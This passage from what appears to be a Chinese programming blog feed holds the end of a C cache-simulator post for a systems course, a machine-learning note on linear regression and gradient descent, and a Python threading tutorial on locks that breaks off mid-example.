    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> setIndex <span class="token operator">=</span> temp <span class="token operator">>></span> <span class="token punctuation">(</span>tagSize <span class="token operator">+</span> property<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    cacheSet set <span class="token operator">=</span> currentCache<span class="token punctuation">.</span>sets<span class="token punctuation">[</span>setIndex<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//loop through lines in the set</span>
    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> hit <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>property<span class="token punctuation">.</span>E<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        setLine currentLine <span class="token operator">=</span> set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//check if there is a hit</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkHit</span><span class="token punctuation">(</span>currentLine<span class="token punctuation">,</span> tag<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">//if hit, update the staffs in the property</span>
            property<span class="token punctuation">.</span>hitNum<span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            hit <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            max <span class="token operator">=</span> <span class="token function">findMax</span><span class="token punctuation">(</span>set<span class="token punctuation">,</span> property<span class="token punctuation">)</span><span class="token punctuation">;</span>
            currentCache<span class="token punctuation">.</span>sets<span class="token punctuation">[</span>setIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter <span class="token operator">=</span> currentCache<span class="token punctuation">.</span>sets<span class="token punctuation">[</span>setIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>lines<span class="token punctuation">[</span>max<span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>hit <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">checkFull</span><span class="token punctuation">(</span>set<span class="token punctuation">,</span> property<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//if not full then it is a miss, update the staffs in the property&amp;set</span>
        property<span class="token punctuation">.</span>missNum<span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        index <span class="token operator">=</span> <span class="token function">findIndex</span><span class="token punctuation">(</span>set<span class="token punctuation">,</span> property<span class="token punctuation">)</span><span class="token punctuation">;</span>
        set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">=</span> tag<span class="token punctuation">;</span>
        set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        max <span class="token operator">=</span> <span class="token function">findMax</span><span class="token punctuation">(</span>set<span class="token punctuation">,</span> property<span class="token punctuation">)</span><span class="token punctuation">;</span>
        currentCache<span class="token punctuation">.</span>sets<span class="token punctuation">[</span>setIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>lines<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter <span class="token operator">=</span> currentCache<span class="token punctuation">.</span>sets<span class="token punctuation">[</span>setIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>lines<span class="token punctuation">[</span>max<span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>hit <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">//evict, update the staffs in the property&amp;set</span>
        property<span class="token punctuation">.</span>missNum<span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
        property<span class="token punctuation">.</span>evictionNum<span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> evictIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//find the evict line</span>
        evictIndex <span class="token operator">=</span> <span class="token function">findEvict</span><span class="token punctuation">(</span>set<span class="token punctuation">,</span> property<span class="token punctuation">)</span><span class="token punctuation">;</span>
        set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>evictIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">=</span> tag<span class="token punctuation">;</span>
        <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        max <span class="token operator">=</span> <span class="token function">findMax</span><span class="token punctuation">(</span>set<span class="token punctuation">,</span> property<span class="token punctuation">)</span><span class="token punctuation">;</span>
        currentCache<span class="token punctuation">.</span>sets<span class="token punctuation">[</span>setIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>lines<span class="token punctuation">[</span>evictIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter <span class="token operator">=</span> currentCache<span class="token punctuation">.</span>sets<span class="token punctuation">[</span>setIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>lines<span class="token punctuation">[</span>max<span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> property<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>当然最后需要些一个主函数来调用测试接口。这里关于trace文件。每一条对内存访问的记录格式是 [空格]操作符 地址,大小，以 I 开头的是载入指令的记录，不算在内存访问中。</p>
<ul>
<li>M 表示数据修改，需要一次载入 + 一次存储，也就是相当于两次访问</li>
<li>S 表示数据存储</li>
<li>L 表示数据载入</li>
<li>地址指的是一个 64 位的 16 进制内存地址</li>
<li>大小表示该操作内存访问的字节数</li>
</ul>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    cache currentCache<span class="token punctuation">;</span>
    cacheProperty property<span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//initiate the char to store the trace</span>
    <span class="token keyword">char</span><span class="token operator">*</span> trace<span class="token punctuation">;</span>
    <span class="token keyword">char</span> input<span class="token punctuation">;</span>
    property<span class="token punctuation">.</span>verbosity <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//parse input</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>input<span class="token operator">=</span><span class="token function">getopt</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span>argv<span class="token punctuation">,</span><span class="token string">"s:E:b:t:vh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">switch</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">case</span> <span class="token string">'s'</span><span class="token punctuation">:</span>
            property<span class="token punctuation">.</span>s <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string">'E'</span><span class="token punctuation">:</span>
            property<span class="token punctuation">.</span>E <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string">'b'</span><span class="token punctuation">:</span>
            property<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string">'t'</span><span class="token punctuation">:</span>
            trace <span class="token operator">=</span> optarg<span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string">'v'</span><span class="token punctuation">:</span>
            property<span class="token punctuation">.</span>verbosity <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//help</span>
        <span class="token keyword">case</span> <span class="token string">'h'</span><span class="token punctuation">:</span>
            <span class="token function">printUsage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">default</span><span class="token punctuation">:</span>
            <span class="token function">printUsage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//compute S and B</span>
    property<span class="token punctuation">.</span>S <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2.0</span><span class="token punctuation">,</span>property<span class="token punctuation">.</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
    property<span class="token punctuation">.</span>B <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2.0</span><span class="token punctuation">,</span>property<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//initialize the cache</span>
    currentCache <span class="token operator">=</span> <span class="token function">initiate</span><span class="token punctuation">(</span>property<span class="token punctuation">.</span>S<span class="token punctuation">,</span> property<span class="token punctuation">.</span>E<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//initialize the counters</span>
    property<span class="token punctuation">.</span>missNum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    property<span class="token punctuation">.</span>hitNum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    property<span class="token punctuation">.</span>evictionNum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//input file</span>
    FILE <span class="token operator">*</span>tmp<span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//wrap the trace into tmp</span>
    <span class="token keyword">char</span> command<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> address<span class="token punctuation">;</span>
    <span class="token keyword">int</span> size<span class="token punctuation">;</span>
    tmp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>trace<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fscanf</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> <span class="token string">" %c %llx,%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>command<span class="token punctuation">,</span> <span class="token operator">&amp;</span>address<span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">switch</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">//just ignore I</span>
            <span class="token keyword">case</span> <span class="token string">'I'</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token string">'L'</span><span class="token punctuation">:</span>
                property <span class="token operator">=</span> <span class="token function">simulate</span><span class="token punctuation">(</span>currentCache<span class="token punctuation">,</span> property<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token string">'S'</span><span class="token punctuation">:</span>
                property <span class="token operator">=</span> <span class="token function">simulate</span><span class="token punctuation">(</span>currentCache<span class="token punctuation">,</span> property<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">//twice for M</span>
            <span class="token keyword">case</span> <span class="token string">'M'</span><span class="token punctuation">:</span>
                property <span class="token operator">=</span> <span class="token function">simulate</span><span class="token punctuation">(</span>currentCache<span class="token punctuation">,</span> property<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>
                property <span class="token operator">=</span> <span class="token function">simulate</span><span class="token punctuation">(</span>currentCache<span class="token punctuation">,</span> property<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>    
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">default</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//print result</span>
    <span class="token function">printSummary</span><span class="token punctuation">(</span>property<span class="token punctuation">.</span>hitNum<span class="token punctuation">,</span> property<span class="token punctuation">.</span>missNum<span class="token punctuation">,</span> property<span class="token punctuation">.</span>evictionNum<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>先总结Part A部分。虽然并没有完全动手写这个代码，仅仅是参考分析他人的代码(主要是没看懂trace文件和不知道怎么调用接口)，但对于cache的操作，通过上面分析源码的含义并参考书中的知识，大致有了比较深刻的理解。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Machine Learning Note 1]]></title>
      <url>http://xinqiu.me/2016/06/02/ml-1/</url>
      <content type="html"><![CDATA[<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>

<blockquote>
<p>Coursera 上的Machine Learning 算得上是经典的机器学习入门课程，是由Andrew Ng大牛上的课。出于对机器学习的好奇，打算用Python来完成这门课的学习。</p>
</blockquote>
<h2 id="Supervised_learning__u76D1_u7763_u5B66_u4E60"><a href="#Supervised_learning__u76D1_u7763_u5B66_u4E60" class="headerlink" title="Supervised learning 监督学习"></a>Supervised learning 监督学习</h2><p>这里存在两种问题 <strong>regression</strong> 和 <strong>classification</strong>。前者是预测相关的问题，后者是分类相关的问题。</p>
<p>首先介绍的是监督学习，notes1中用房屋价格预测来介绍Linear Regression线性回归。这里因为没有数据集，所以我选择用ex<br>1中的<code>ex1data1.txt</code>来做演示。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
data <span class="token operator">=</span> np<span class="token punctuation">.</span>loadtxt<span class="token punctuation">(</span><span class="token string">'ex1data1.txt'</span><span class="token punctuation">,</span> delimiter<span class="token operator">=</span><span class="token string">','</span><span class="token punctuation">)</span>
m <span class="token operator">=</span> data<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
X <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>
y <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span>
plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>X<span class="token punctuation">,</span> y<span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span> marker<span class="token operator">=</span><span class="token string">'x'</span><span class="token punctuation">,</span> linewidths<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>xlim<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> max<span class="token punctuation">(</span>X<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'Profit in $10,000s'</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'Population of City in 10,000s'</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>可以画出数据分布散点图。</p>
<a id="more"></a>
<p><img src="1.png" alt=""></p>
<p>机器学习的流程如下</p>
<pre><code>          +------------------+
          |                  |
          |     Training     |
          |       set        |
          |                  |
          +------------------+
                   ||
                   ||
          +--------\/--------+
          |                  |
          |     Learning     |
          |     algorithm    |
          |                  |
          +------------------+
                   ||
                   ||
          +--------\/--------+
          |                  |
          |    hypothesis    |
X +-------&gt;                  +-------&gt;  Y
          |                  |
          +------------------+
</code></pre><p>用大量的训练数据带入学习算法中进行学习，学习算法产生假设模型，通过假设模型，可以由未知数据X得出需要的Y。</p>
<h3 id="Linear_Regression__u7EBF_u6027_u56DE_u5F52"><a href="#Linear_Regression__u7EBF_u6027_u56DE_u5F52" class="headerlink" title="Linear Regression 线性回归"></a>Linear Regression 线性回归</h3><p>根据 <code>ex1data2.txt</code> 里的数据，因为有两个特征，所以可以写出假设模型</p>
<p>$$ h_{\theta } = \theta_{0}+ \theta_{1}x_{1}+\theta_{2}x_{2}$$</p>
<p>其中 $\theta_{i}$ 是线性方程的确定性参数(有点类似权重的东西？)。所以，假设 $ x_{0} = 1$, 从广义上可以定义假设方程</p>
<p>$$h_{\theta } =\sum_{n}^{i=0}\theta_{i}x_{i}=\theta^{T}x$$</p>
<p>其中 $\theta$ 和 $x$ 都是向量，$n$ 是输入变量的个数。</p>
<p>确定完假设模型，之后需要做的一件事是挑选学习 $\theta$。一个可靠的方法可以让 $h(x)$ 接近 $y$。为了评估假设模型与数据集的接近程度，定义了一个 <strong>cost function</strong>（代价函数）</p>
<p>$$ J(\theta )=\frac{1}{2}\sum_{m}^{i=1}(h_{\theta}(x^{(i)})-y^{(i)})^{2} $$</p>
<p>这是least-squares cost function，是 <strong>ordinary least squares regression model</strong> 的一部分。</p>
<h4 id="LMS_algorithm"><a href="#LMS_algorithm" class="headerlink" title="LMS algorithm"></a>LMS algorithm</h4><p>为了寻找合适的 $\theta$ 使 $J(\theta )$ 最小，可以使用LMS算法通过不断的改变 $\theta$ 来寻找合适的值。这里使用了 <strong>gradient descent algorithm</strong>(梯度递减算法)，更新 $\theta$ 的方式如下</p>
<p>$$ \theta_{j} := \theta_{j} -\alpha \frac{\partial }{\partial \theta_{j}}J(\theta) $$</p>
<p>其中，$\alpha$ 是 <strong>learning rate</strong>（学习率）, $\frac{\partial }{\partial \theta_{j}}J(\theta)$ 可以化简为<br>$$ \frac{\partial }{\partial \theta_{j}}J(\theta) = (h_{\theta}(x)-y)x_{j} $$</p>
<p>这样的更新规则称为LMS update rule(least mean squares),也称为Widrow-Hoﬀ learning rule.</p>
<p>$$  \theta_{j} := \theta_{j} + \alpha  (y^{(i)} -h_{\theta}(x^{(i)}))x_{j}^{(i)}$$</p>
<p>梯度递减这里提到了两种 <strong>batch gradient descent</strong> (批量梯度递减) 和 <strong>stochastic gradient descent</strong> (随机梯度递减)。</p>
<h4 id="The_normal_equations"><a href="#The_normal_equations" class="headerlink" title="The normal equations"></a>The normal equations</h4><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol>
<li><p><a href="http://cs229.stanford.edu/notes/cs229-notes1.ps" target="_blank" rel="external">CS229 notes1</a></p>
</li>
<li><p><a href="https://www.coursera.org/learn/machine-learning" target="_blank" rel="external">Coursera Machine Learning</a></p>
</li>
<li><p><a href="http://blog.csdn.net/lilyth_lilyth/article/details/8973972" target="_blank" rel="external">随机梯度下降（Stochastic gradient descent）和 批量梯度下降（Batch gradient descent ）的公式对比、实现对比</a></p>
</li>
</ol>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Python线程学习]]></title>
      <url>http://xinqiu.me/2016/05/10/python-thread/</url>
      <content type="html"><![CDATA[<p>Python2.7中有两个常用的多线程库Multiprocessing，Threading。在Python中，线程和进程的区别在于线程模块使用线程，进程模块使用进程233，不开玩笑，这是StackOverFlow上的解释。说重点，线程使用相同的内存空间，而进程使用不同的。这也就让进程之间传对象稍有点困难。当然，由于线程共享内存空间，那么必须要考虑线程安全。</p>
<h2 id="thread"><a href="#thread" class="headerlink" title="thread"></a>thread</h2><p>thread算是轻量级的线程模块，它提供较为底层的多线程实现方案。使用start_new_thread(function, args[, kwargs])实现线程。使用allocate_lock()可以得到一个锁对象，用acquire()和release()来加锁和释放锁，用locked()来判断释放有锁。一把锁只能被一个线程得到，所以利用锁可以避免多个线程对同一资源的同时操作。</p>
<a id="more"></a>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> thread
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep

<span class="token keyword">def</span> <span class="token function">addLock</span><span class="token punctuation">(</span>lock<span class="token punctuation">)</span><span class="token punctuation">:</span>
    lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 获得锁</span>
    <span class="token keyword">print</span> lock<span class="token punctuation">.</span>locked<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 判断是否有锁</span>
    sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 释放锁</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    lock <span class="token operator">=</span> thread<span class="token punctuation">.</span>allocate<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 分配一个锁对象</span>
    thread<span class="token punctuation">.</span>start_new<span class="token punctuation">(</span>addLock<span class="token punctuation">,</span><span class="token punctuation">(</span>lock<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 开辟一个线程</span>
    thread<span class="token punctuation">.</span>start_new<span class="token punctuation">(</span>addLock<span class="token punctuation">,</span><span class="token punctuation">(</span>lock<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h2 id="threading"><a href="#threading" class="headerlink" title="threading"></a>threading</h2><p>threading作为一个更高级的模块，提供了一些thread没有的功能。threading中有两种锁，如threading.Lock()， threading.RLock()。</p>
<h3 id="Lock"><a href="#Lock" class="headerlink" title="Lock"></a>Lock</h3><p>这里lock和thread模块里类似。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading

<span class="token keyword">def</span> <span class="token function">addLock</span><span class="token punctuation">(</span>lock<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># lock.release()</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    lock <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>
    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>addLock<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>lock<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    t2 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>addLock<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>lock<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    t1<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
    t2<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>以上代码演示了利用Threading模块来确定一把锁只能被获得一次。</p>
<h3 id="RLock"><a href="#RLock" class="headerlink" title="RLock"></a>RLock</h3><p>RLock是可重入锁（reentrant lock），acquire()能够不被阻塞的被同一个线程调用多次。要注意的是release()需要调用与acquire()相同的次数才能释放锁。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token punctuation">,</span>time

rlock<span class="token operator">=</span>threading<span class="token punctuation">.</span>RLock<span class="token punctuation">(</span><span class="token punctuation">)</span>
result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">step1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> result
    <span class="token keyword">if</span> rlock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'step1'</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        rlock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">step2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> result
    <span class="token keyword">if</span> rlock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'step2'</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        rlock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">showresult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 查看当前线程</span>
    <span class="token keyword">if</span> rlock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        step1<span class="token punctuation">(</span><span class="token punctuation">)</span>
        step2<span class="token punctuation">(</span><span class="token punctuation">)</span>
        rlock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> result

<span class="token keyword">def</span> <span class="token function">clearresult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> result
    <span class="token keyword">if</span> rlock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        result<span class="token operator">=</span>None
